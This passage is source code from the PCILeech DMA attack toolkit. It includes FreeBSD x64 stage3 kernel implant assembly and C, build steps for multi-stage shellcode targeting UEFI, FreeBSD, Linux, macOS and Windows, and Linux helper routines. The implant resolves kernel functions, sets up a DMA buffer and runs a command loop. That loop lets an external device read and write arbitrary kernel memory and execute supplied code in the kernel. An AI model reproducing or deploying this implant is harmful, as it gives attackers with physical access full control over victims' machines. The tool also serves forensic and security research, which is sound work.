	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

data_str_vm_phys_alloc_contig			db 'vm_phys_alloc_contig', 0
data_str_kthread_start					db 'kthread_start', 0
data_str_pcileech						db 'pcileech', 0

END

```

`pcileech_shellcode/fbsdx64_stage3.asm`:

```asm
; fbsdx64_stage3.asm : assembly to receive execution from stage2 shellcode.
; Compatible with FreeBSD x64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS wx64_stage3_pre.asm
	; ----------------------------------------------------
	label_main_base:
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_base
	; ----------------------------------------------------
	; 2: CALL C CODE
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
	ENTER 20h, 0
	CALL stage3_c_EntryPoint
	LEAVE
	; ----------------------------------------------------
	; 3: RESTORE AND JMP BACK
	; ----------------------------------------------------
	RET
main ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN BSD KERNEL
; destroyed registers :: rsi
; rcx -> PKMDDATA
; rdx -> rdi -> ptr to symbol/function str
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionBSD PROC
	PUSH rdi
	PUSH rsi
	MOV rdi, rdx
	MOV rcx, [rcx+58h]			; [PKMDDATA->ReservedKMD]
	MOV rdx, rcx				; [PKMDDATA->ReservedKMD]
	SUB rcx, 8
	loop_symsearch:
	SUB rcx, 18h
	MOV rax, [rcx]
	TEST rax, rax
	JZ error
	MOV esi, [rcx]
	ADD rsi, rdx
	CALL strcmp_simple
	TEST rax, rax
	JNZ loop_symsearch
	MOV rax, [rcx+8]
	POP rsi
	POP rdi
	RET
	error:
	XOR rax, rax
	POP rsi
	POP rdi
	RET
LookupFunctionBSD ENDP

; ----------------------------------------------------
; Lookup functions in the FreeBSD kernel image.
; This function is called by the c-code.
; rcx = PKMDDATA
; rdx = ptr to FNBSD struct
; rax <- TRUE(1)/FALSE(0)
; ----------------------------------------------------
LookupFunctionsDefaultFreeBSD PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	PUSH r12
	MOV r12, rsp
	MOV r15, rcx				; PKMDDATA
	MOV r14, rdx				; PFNBSD
	MOV r13, 7*8				; num functions * 8
	; ----------------------------------------------------
	; 1: PUSH FUNCTION NAME POINTERS ON STACK
	; ----------------------------------------------------
	LEA rax, str_dump_avail
	PUSH rax
	LEA rax, str_kthread_exit
	PUSH rax
	LEA rax, str_memcpy
	PUSH rax
	LEA rax, str_memset
	PUSH rax
	LEA rax, str_pause_sbt
	PUSH rax
	LEA rax, str_vm_phys_alloc_contig
	PUSH rax
	LEA rax, str_vm_phys_free_contig
	PUSH rax
	; ----------------------------------------------------
	; 2: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15				; PKMDDATA
	POP rdx
	CALL LookupFunctionBSD
	TEST rax, rax
	JZ lookup_fail
	MOV [r14+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	MOV rax, 1
	JMP cleanup_return
	lookup_fail:
	XOR rax, rax
	cleanup_return:
	MOV rsp, r12
	POP r12
	POP r13
	POP r14
	POP r15
	RET
LookupFunctionsDefaultFreeBSD ENDP

str_dump_avail					db 'dump_avail', 0
str_kthread_exit				db 'kthread_exit', 0
str_memcpy						db 'memcpy', 0
str_memset						db 'memset', 0
str_pause_sbt					db 'pause_sbt', 0
str_vm_phys_alloc_contig		db 'vm_phys_alloc_contig', 0
str_vm_phys_free_contig			db 'vm_phys_free_contig', 0

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of ten (10)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi
	PUSH r14
	PUSH r15
	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+4*8+00h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+4*8+08h]
	MOV r9,  [rsp+28h+4*8+10h]
	MOV r15, rsp
	MOV r14, [rsp+28h+4*8+30h] ; 20h stack shadow space + 8h (RET) + 3*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+5*8+28h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+6*8+20h] ; 20h stack shadow space + 8h (RET) + 5*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+7*8+18h] ; 20h stack shadow space + 8h (RET) + 6*8h PUSH + xxh offset
	PUSH r14
	CALL rax
	MOV rsp, r15
	POP r15
	POP r14
	POP rsi
	POP rdi
	RET
SysVCall ENDP

END

```

`pcileech_shellcode/fbsdx64_stage3_c.c`:

```c
// fbsdx64_stage3_c.c : stage3 main shellcode.
// Compatible with FreeBSD x64.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0

//-------------------------------------------------------------------------------
// General defines below.
//-------------------------------------------------------------------------------

#define BSD_PHYS2VIRT_BASE 0xFFFFF80000000000ULL

typedef struct tdvm_page_t {
	QWORD _opaque[6];
	QWORD qwPA;
} *vm_page_t;

typedef struct tdPHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct tdPHYSICAL_MEMORY_RANGE_BSD {
	QWORD StartAddress;
	QWORD EndAddress;
} PHYSICAL_MEMORY_RANGE_BSD, *PPHYSICAL_MEMORY_RANGE_BSD;

typedef struct tdFNBSD { // function pointers to BSD functions and structs
	QWORD dump_avail;
	QWORD kthread_exit;
	QWORD memcpy;
	QWORD memset;
	QWORD pause_sbt;
	QWORD vm_phys_alloc_contig;
	QWORD vm_phys_free_contig;
	QWORD ReservedFutureUse[25];
} FNBSD, *PFNBSD;

#define KMDDATA_OPERATING_SYSTEM_FREEBSD		0x08

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNBSD fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

//-------------------------------------------------------------------------------
// Assembly functions below.
//-------------------------------------------------------------------------------

extern BOOL LookupFunctionsDefaultFreeBSD(PKMDDATA pk, QWORD qwAddrFNBSD);
extern QWORD SysVCall(QWORD fn, ...);

//-------------------------------------------------------------------------------
// Kernel module functions below.
//-------------------------------------------------------------------------------

/*
* Retrieve system memory ranges from the dump_avail memory structure.
*/
BOOL SetMemoryRanges(PKMDDATA pk)
{
	PPHYSICAL_MEMORY_RANGE pmr = (PPHYSICAL_MEMORY_RANGE)pk->DMAAddrVirtual;
	PPHYSICAL_MEMORY_RANGE_BSD pmrBSD = (PPHYSICAL_MEMORY_RANGE_BSD)pk->fn.dump_avail;
	QWORD i = 0;
	while(pmrBSD[i].StartAddress || pmrBSD[i].EndAddress) {
		pmr[i].BaseAddress = pmrBSD[i].StartAddress;
		pmr[i].NumberOfBytes = pmrBSD[i].EndAddress - pmrBSD[i].StartAddress;
		i++;
	}
	pk->_size = i * sizeof(PHYSICAL_MEMORY_RANGE);
	return TRUE;
}

#define SBT_1S		(1ULL << 32)
#define SBT_1MS		(SBT_1S / 1000)

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	QWORD idleCount = 0;
	vm_page_t pg_phys;
	// 1: set up symbols and kmd data
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_FREEBSD;
	if(!LookupFunctionsDefaultFreeBSD(pk, (QWORD)&pk->fn)) {
		pk->_status = 0xf0000001;
		return;
	}
	// 1: set up mem out DMA area 4MB/16MB in lower 4GB
	pk->DMASizeBuffer = 0x1000000;
	pg_phys = (vm_page_t)SysVCall(pk->fn.vm_phys_alloc_contig, 0x1000000 / 0x1000, 0, 0xf0000000, 0x1000, 0);
	if(!pg_phys) {
		pk->DMASizeBuffer = 0x00400000;
		SysVCall(pk->fn.vm_phys_alloc_contig, 0x00400000 / 0x1000, 0, 0xf0000000, 0x1000, 0);
	}
	if(!pg_phys) {
		pk->DMASizeBuffer = 0;
		pk->_status = 0xf0000002;
		return;
	}
	pk->DMAAddrPhysical = pg_phys->qwPA;
	pk->DMAAddrVirtual = BSD_PHYS2VIRT_BASE | pg_phys->qwPA;
	// 3: main command loop.
	while(TRUE) {
		pk->_status = 1;
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			idleCount++;
			if(idleCount > 10000000000) {
				SysVCall(pk->fn.pause_sbt, "pcileech", SBT_1MS, 0, 0); // 1ms
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			SysVCall(pk->fn.vm_phys_free_contig, pg_phys, pk->DMASizeBuffer / 0x1000);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			SysVCall(pk->fn.kthread_exit);
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pk->_result = SetMemoryRanges(pk);
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))pk->DMAAddrVirtual)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ == pk->_op) { // READ
			SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, BSD_PHYS2VIRT_BASE | pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE == pk->_op) { // WRITE
			SysVCall(pk->fn.memcpy, BSD_PHYS2VIRT_BASE | pk->_address, pk->DMAAddrVirtual, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			SysVCall(pk->fn.memcpy, pk->_address, pk->DMAAddrVirtual, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		idleCount = 0;
	}
}

```

`pcileech_shellcode/info_kmd_core.txt`:

```txt
# compile instructions for the various kernel module shellcode sources.
#
#======================================== UEFI ========================================
#
# COMPILE C CODE TO OBJ FILE
cl.exe /O1 /Os /Oy /FD /MT /Zp1 /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_kmd_c.c
#
# COMPILE ASM AND LINK C OBJ FILE TO EXE
ml64 uefi_kmd.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "uefi_kmd_c.obj"
#
# EXTRACT SHELLCODE (shellcode saved as uefi_kmd.bin, c-ify by xxd -i uefi_kmd.bin)
shellcode64.exe -o uefi_kmd.exe
#
#======================================== FreeBSD ========================================
#
# compile instructions for the FreeBSD x64 kernel module code
#
#=============== STAGE 1 ===============
#
# COMPILE ASM TO EXE (SAME CODE AS FOR WINDOWS)
ml64 wx64_stage1.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
#
# EXTRACT SHELLCODE (shellcode saved as wx64_stage1.bin, c-ify by xxd -i wx64_stage1.bin)
shellcode64.exe -o wx64_stage1.exe
#
#=============== STAGE 2 ===============
#
# COMPILE ASM TO EXE
ml64 fbsdx64_stage2.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main 
#
# EXTRACT SHELLCODE (shellcode saved as fbsdx64_stage2.bin, c-ify by xxd -i fbsdx64_stage2.bin)
shellcode64.exe -o fbsdx64_stage2.exe
#
#=============== STAGE 3 ===============
#
# COMPILE C CODE TO OBJ FILE
cl.exe /O1 /Os /Oy /FD /MT /Zp1 /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel fbsdx64_stage3_c.c
#
# COMPILE ASM AND LINK C OBJ FILE TO EXE
ml64 fbsdx64_stage3.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "fbsdx64_stage3_c.obj"
#
# EXTRACT SHELLCODE (shellcode saved as fbsdx64_stage3.bin, c-ify by xxd -i fbsdx64_stage3.bin)
shellcode64.exe -o fbsdx64_stage3.exe
#
#======================================== LINUX ========================================
#
# compile instructions for the linux x64 kernel module code
#
#=============== STAGE 1 ===============
#
# COMPILE ASM TO EXE (SAME CODE AS FOR WINDOWS)
ml64 wx64_stage1.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
#
# EXTRACT SHELLCODE (shellcode saved as wx64_stage1.bin, c-ify by xxd -i wx64_stage1.bin)
shellcode64.exe -o wx64_stage1.exe
#
#=============== STAGE 2 ===============
#
# COMPILE ASM TO EXE
ml64 lx64_stage2.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
#
# EXTRACT SHELLCODE (shellcode saved as lx64_stage2.bin, c-ify by xxd -i lx64_stage2.bin)
shellcode64.exe -o lx64_stage2.exe
#
#=============== STAGE 3 ===============
#
# COMPILE C CODE TO OBJ FILE
cl.exe /O1 /Os /Oy /FD /MT /Zp1 /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_stage3_c.c
#
# COMPILE ASM AND LINK C OBJ FILE TO EXE
ml64 lx64_stage3.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "lx64_stage3_c.obj"
#
# EXTRACT SHELLCODE (shellcode saved as lx64_stage3.bin, c-ify by xxd -i lx64_stage3.bin)
shellcode64.exe -o lx64_stage3.exe
#
#======================================== macOS ========================================
#
# compile instructions for the macOS kernel module code
#
#=============== STAGE 1 ===============
#
# COMPILE ASM TO EXE (SAME CODE AS FOR WINDOWS)
ml64 wx64_stage1.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
#
# EXTRACT SHELLCODE (shellcode saved as wx64_stage1.bin, c-ify by xxd -i wx64_stage1.bin)
shellcode64.exe -o wx64_stage1.exe
#
#=============== STAGE 2 ===============
#
# COMPILE ASM TO EXE
ml64 macos_stage2.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main 
#
# EXTRACT SHELLCODE (shellcode saved as macos_stage2.bin, c-ify by xxd -i macos_stage2.bin)
shellcode64.exe -o macos_stage2.exe
#
#=============== STAGE 3 ===============
#
# COMPILE C CODE TO OBJ FILE
cl.exe /O1 /Os /Oy /FD /MT /Zp1 /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_stage3_c.c
#
# COMPILE ASM AND LINK C OBJ FILE TO EXE
ml64 macos_stage3.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "macos_stage3_c.obj"
#
# EXTRACT SHELLCODE (shellcode saved as macos_stage3.bin, c-ify by xxd -i macos_stage3.bin)
shellcode64.exe -o macos_stage3.exe
#
#======================================== Windows x64 ========================================
#
# compile instructions for the Windows x64 kernel module code
#
#=============== STAGE 1 ===============
#
# COMPILE ASM TO EXE
ml64 wx64_stage1.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
#
# EXTRACT SHELLCODE (shellcode saved as wx64_stage1.bin, c-ify by xxd -i wx64_stage1.bin)
shellcode64.exe -o wx64_stage1.exe
#
#=============== STAGE 2 ===============
#
# COMPILE ASM AND LINK C OBJ FILE TO EXE
ml64 wx64_stage2.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
#
# EXTRACT SHELLCODE (shellcode saved as wx64_stage2.bin, c-ify by xxd -i wx64_stage2.bin)
shellcode64.exe -o wx64_stage2.exe
#
#=============== STAGE 3 ===============
#
# COMPILE C CODE TO OBJ FILE
cl.exe /O1 /Os /Oy /FD /MT /Zp1 /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_stage3_c.c
#
# COMPILE ASM AND LINK C OBJ FILE TO EXE
ml64 wx64_stage3.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "wx64_stage3_c.obj"
#
# EXTRACT SHELLCODE (shellcode saved as wx64_stage3.bin, c-ify by xxd -i wx64_stage3.bin)
shellcode64.exe -o wx64_stage3.exe
#
#
#=========== Windows x64 - WIN10_X64_2 - VMM.DLL assisted technique  ===========
#
cl.exe /O1 /Os /Oy /FD /MT /Zp1 /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_stage3_c.c
ml64 wx64_stage23_vmm.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "wx64_stage3_c.obj"
shellcode64.exe -o wx64_stage23_vmm.exe
#
#=========== Windows x64 - WIN10_X64_3 - VMM.DLL assisted technique  ===========
#
cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_stage3_c.c
ml64 wx64_stage23_vmm3.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main "wx64_stage3_c.obj"
shellcode64.exe -o wx64_stage23_vmm3.exe
```

`pcileech_shellcode/lx64_common.c`:

```c
// lx64_common.c : support functions used by Linux x64 KMDs started by stage3 EXEC.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "lx64_common.h"

BOOL _WriteLargeOutput_WaitForAck(PKMDDATA pk)
{
	PEXEC_IO pis = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_IS);
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	while((pk->_op == KMD_CMD_EXEC_EXTENDED) && ((pis->magic != EXEC_IO_MAGIC) || (!pis->bin.fCompletedAck && (pis->bin.seqAck != pos->bin.seq)))) {
		SysVCall((QWORD)pk->fn[0] /* msleep */, 25);
	}
	return (pk->_op == KMD_CMD_EXEC_EXTENDED) && !pis->bin.fCompletedAck;
}

BOOL WriteLargeOutput_WaitNext(PKMDDATA pk)
{
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	pos->magic = EXEC_IO_MAGIC;
	CacheFlush();
	pos->bin.seq++;
	pk->_op = KMD_CMD_EXEC_EXTENDED;
	return _WriteLargeOutput_WaitForAck(pk);
}

VOID WriteLargeOutput_Finish(PKMDDATA pk)
{
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	WriteLargeOutput_WaitNext(pk);
	pk->dataOutExtraLength = 0;
	CacheFlush();
	pos->bin.fCompleted = TRUE;
	pos->bin.seq++;
	_WriteLargeOutput_WaitForAck(pk);
	pk->_op = KMD_CMD_EXEC;
}

```

`pcileech_shellcode/lx64_common.h`:

```h
// lx64_common.h : declarations of commonly used shellcode functions
// Compatible with Linux x64.
//
// Author: Ulf Frisk, pcileech@frizk.net
//

#ifndef __LX64_COMMON_H__
#define __LX64_COMMON_H__

#include "statuscodes.h"

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WCHAR, *PWCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
typedef unsigned long			STATUS;
#define NULL					((void *)0)
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0
#define UNREFERENCED_PARAMETER(P) (P)
#define LOOKUP_FUNCTION(pk, szFn) (SysVCall(pk->AddrKallsymsLookupName, szFn))

extern QWORD SysVCall(QWORD fn, ...);
extern QWORD WinCall(QWORD p1, ...);
extern VOID WinCallSetFunction(QWORD pfn);
extern BOOL  LookupFunctions(QWORD qwAddr_KallsymsLookupName, QWORD pqwNameTable, QWORD pqwFnTable, QWORD cFunctions);
extern QWORD m_phys_to_virt(QWORD p1);
extern QWORD m_page_to_phys(QWORD p1);
extern VOID CacheFlush();

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define EXEC_IO_MAGIC					0x12651232dfef9521
#define EXEC_IO_CONSOLE_BUFFER_SIZE		0x800
#define EXEC_IO_DMAOFFSET_IS			0x80000
#define EXEC_IO_DMAOFFSET_OS			0x81000
typedef struct tdEXEC_IO {
	QWORD magic;
	struct {
		QWORD cbRead;
		QWORD cbReadAck;
		QWORD Reserved[10];
		BYTE  pb[800];
	} con;
	struct {
		QWORD seq;
		QWORD seqAck;
		QWORD fCompleted;
		QWORD fCompletedAck;
	} bin;
	QWORD Reserved[395];
} EXEC_IO, *PEXEC_IO;

/*
* If a large output is to be written to PCILeech which won't fit in the DMA
* buffer - write as much as possible in the DMA buffer and then call this fn.
* When returned successfully write another chunk to this buffer and call again.
* WriteLargeOutput_Finish must be called after all data is written to clean up.
* -- pk
* -- return
*/
BOOL WriteLargeOutput_WaitNext(PKMDDATA pk);

/*
* Clean up function that must be called if WriteLargeOutput_WaitNext has
* previously been called.
* -- pk
*/
VOID WriteLargeOutput_Finish(PKMDDATA pk);

#endif /* __LX64_COMMON_H__ */
```

`pcileech_shellcode/lx64_common_a.asm`:

```asm
; lx64_common_a.asm : assembly to receive execution from stage3 exec command.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

; -------------------------------------
; Prototypes
; -------------------------------------
main PROTO
LookupFunctions PROTO
SysVCall PROTO 
WinCallSetFunction PROTO
m_phys_to_virt PROTO
m_page_to_phys PROTO
EXTRN c_EntryPoint:NEAR

; -------------------------------------
; Code
; -------------------------------------
.CODE

main PROC
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL c_EntryPoint
	MOV rsp, rsi
	POP rsi
	RET
main ENDP

; ------------------------------------------------------------------
; Lookup function pointers and place them in the supplied struct
; rcx -> address of kallsyms_lookup_name
; rdx -> ptr to name array
; r8  -> ptr to function destination array
; r9  -> number of items in array
; rax <- 0 = FAIL, 1 = SUCCESS
; ------------------------------------------------------------------
LookupFunctions PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	PUSH r12
	MOV r15, rcx				; address of kallsyms_lookup_name
	MOV r14, rdx				; ptr to funcion name array
	MOV r13, r9					; num functions * 8
	SHL r13, 3
	MOV r12, r8					; ptr to function destination array
	; ----------------------------------------------------
	; 1: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15
	MOV rdx, [r14+r13]
	CALL SysVCall
	TEST rax, rax
	JZ lookup_fail
	MOV [r12+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	XOR rax, rax
	INC rax
	JMP lookup_exit
	lookup_fail:
	XOR rax, rax
	lookup_exit:
	POP r12
	POP r13
	POP r14
	POP r15
	RET
LookupFunctions ENDP

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
